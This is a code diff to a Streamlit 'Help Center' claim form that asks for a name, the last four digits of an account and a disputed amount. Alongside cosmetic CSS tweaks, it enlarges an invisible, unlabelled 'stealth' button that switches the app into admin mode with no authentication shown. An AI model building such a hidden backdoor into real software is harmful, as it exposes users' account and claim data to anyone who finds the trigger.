@@ -40,15 +40,15 @@ st.markdown("""<style>
         visibility: hidden !important;
     }
 
-    /* RESPONSIVE LOGO SIZE */
+    /* REFINED RESPONSIVE LOGO */
     [data-testid="stImage"] img {
-        width: 250px !important; /* Larger for Desktop */
+        width: 280px !important; /* Larger for Desktop */
         height: auto !important;
     }
 
     @media (max-width: 768px) {
         [data-testid="stImage"] img {
-            width: 150px !important; /* Smaller for Mobile */
+            width: 130px !important; /* Smaller for Mobile */
         }
     }
 
@@ -70,7 +70,7 @@ st.markdown("""<style>
     .stealth-trigger {
         position: absolute !important;
         bottom: 0 !important; left: 0 !important;
-        width: 30px !important; height: 30px !important;
+        width: 40px !important; height: 40px !important;
         z-index: 999 !important;
     }
     
@@ -78,8 +78,8 @@ st.markdown("""<style>
         background: transparent !important;
         border: none !important;
         color: transparent !important;
-        width: 30px !important;
-        height: 30px !important;
+        width: 40px !important;
+        height: 40px !important;
         cursor: default !important;
     }
 
@@ -92,31 +92,33 @@ st.markdown("""<style>
         color: #666 !important;
         text-align: center !important;
         margin-top: 40px !important;
-        padding-top: 20px !important;
+        padding: 20px 10px !important;
         border-top: 1px solid #222 !important;
         line-height: 1.6 !important;
+        background: transparent !important;
     }
     
-    /* Prevent legal text from looking like buttons */
+    /* Final fix for legal text glitches */
     .legal-container * {
         background: transparent !important;
         color: #666 !important;
         border: none !important;
-        padding: 0 !important;
+        pointer-events: none !important;
+        display: inline !important;
     }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
-    col_logo = st.columns([1, 2, 1])[1]
+    col_logo = st.columns([1, 3, 1])[1]
     with col_logo:
         if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
 
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_1_final", clear_on_submit=True):
+    with st.form("claim_v32_8_2", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -137,7 +139,7 @@ if not st.session_state.admin_mode:
     """, unsafe_allow_html=True)
     
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v81_final"):
+    if st.button(" ", key="stealth_admin_v82"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
